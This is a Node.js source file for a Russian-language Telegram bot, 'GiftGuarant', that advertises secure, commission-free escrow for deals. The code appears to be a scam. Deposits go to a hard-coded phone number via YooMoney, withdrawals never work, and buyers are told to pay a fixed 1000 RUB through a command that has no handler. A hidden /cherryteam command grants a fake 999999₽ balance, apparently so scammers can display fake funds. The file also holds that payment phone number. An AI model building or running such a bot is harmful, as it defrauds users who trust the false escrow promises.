require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const express = require('express');

const app = express();
const bot = new Telegraf(process.env.BOT_TOKEN);

// Простое хранилище в памяти
const userBalances = new Map();
const deals = new Map();

// Главное меню
async function showMainMenu(ctx) {
  const caption = `👋 Добро пожаловать!\n\n💼 Надёжный сервис для безопасных сделок!\n✨ Автоматизировано, быстро и без лишних хлопот!\n\n🔹 Никакой комиссии\n🔹 Поддержка 24/7\n\n💌 Теперь ваши сделки под защитой! 🛡`;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('🌏 Открыть в приложении', 'open_app'),
      Markup.button.callback('📁 Мои сделки', 'my_deals')
    ],
    [Markup.button.callback('⚙️ Настройки', 'settings')]
  ]);

  await ctx.reply(caption, { 
    parse_mode: 'Markdown',
    ...keyboard
  });
}

// Обработка кнопок
bot.action('open_app', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply('🌏 Веб-приложение будет доступно скоро!');
});

bot.action('my_deals', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply('📁 У вас пока нет сделок');
});

bot.action('settings', async (ctx) => {
  const balance = userBalances.get(ctx.from.id) || 0;
  
  const caption = `⚙️ *Настройки*\n\n💰 Баланс: ${balance}₽\n🌎 Язык: Русский`;
  
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('💰 Баланс', 'balance_menu')],
    [Markup.button.callback('⏪ Назад', 'main_menu')]
  ]);

  await ctx.editMessageText(caption, { 
    parse_mode: 'Markdown',
    ...keyboard
  });
});

bot.action('balance_menu', async (ctx) => {
  const balance = userBalances.get(ctx.from.id) || 0;
  
  const caption = `💰 *Баланс: ${balance}₽*\n\nВыберите действие:`;
  
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('📥 Пополнить', 'deposit')],
    [Markup.button.callback('📤 Вывести', 'withdraw')],
    [Markup.button.callback('⏪ Назад', 'settings')]
  ]);

  await ctx.editMessageText(caption, { 
    parse_mode: 'Markdown',
    ...keyboard
  });
});

bot.action('deposit', async (ctx) => {
  const caption = `📥 *Пополнение баланса*\n\nЧтобы пополнить баланс, отправьте нужную сумму на:\n\n📞 89202555790\n💳 Юмани`;
  
  await ctx.editMessageText(caption, { 
    parse_mode: 'Markdown'
  });
});

bot.action('withdraw', async (ctx) => {
  await ctx.editMessageText('📤 Вывод средств будет доступен скоро!');
});

bot.action('main_menu', async (ctx) => {
  await ctx.deleteMessage().catch(() => {});
  await showMainMenu(ctx);
});

// Команда создания сделки
bot.command('create', async (ctx) => {
  const dealId = Math.random().toString(36).substring(2, 8).toUpperCase();
  const dealLink = `https://t.me/${ctx.botInfo.username}?start=deal_${dealId}`;
  
  // Сохраняем сделку
  deals.set(dealId, {
    seller_id: ctx.from.id,
    deal_link: dealLink,
    status: 'active'
  });

  const caption = `💥 Сделка успешно создана!\n\nТип сделки: Общая\n\nОтдаете: \nПолучаете: \n\n⛓️ Ссылка для покупателя:\n${dealLink}`;
  
  await ctx.reply(caption, { parse_mode: 'Markdown' });
});

// Обработка старта со сделкой
bot.start(async (ctx) => {
  const startPayload = ctx.startPayload;
  
  if (startPayload && startPayload.startsWith('deal_')) {
    const dealId = startPayload.replace('deal_', '');
    const deal = deals.get(dealId);
    
    if (!deal) {
      await ctx.reply('❌ Сделка не найдена');
      return showMainMenu(ctx);
    }
    
    if (deal.seller_id === ctx.from.id) {
      await ctx.reply(`🔗 Это ваша сделка #${dealId}`);
      return showMainMenu(ctx);
    }
    
    // Покупатель
    const caption = `📋 Информация о сделке #${dealId}\n\n👤 Вы покупатель в сделке.\n💰 Сумма сделки: 1000 RUB\n\n💳 Для оплаты используйте команду:\n/pay_${dealId}`;
    
    await ctx.reply(caption, { parse_mode: 'Markdown' });
    return;
  }
  
  await showMainMenu(ctx);
});

// Простые админ команды
bot.command('cherryteam', async (ctx) => {
  userBalances.set(ctx.from.id, 999999);
  await ctx.reply('🍒 Бесконечный баланс активирован!');
});

bot.command('deals', async (ctx) => {
  if (deals.size === 0) {
    await ctx.reply('📭 Сделок нет');
    return;
  }
  
  let caption = '📊 Все сделки:\n\n';
  deals.forEach((deal, dealId) => {
    caption += `#${dealId} - ${deal.status}\n`;
  });
  
  await ctx.reply(caption);
});

bot.command('ban', async (ctx) => {
  await ctx.reply('🚫 Команда бана будет доступна скоро');
});

// Express сервер для Render
app.get('/', (req, res) => {
  res.send('🤖 GiftGuarant Bot is running!');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});

// Запуск бота
bot.launch().then(() => {
  console.log('✅ Бот запущен!');
}).catch((error) => {
  console.error('❌ Ошибка запуска бота:', error);
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
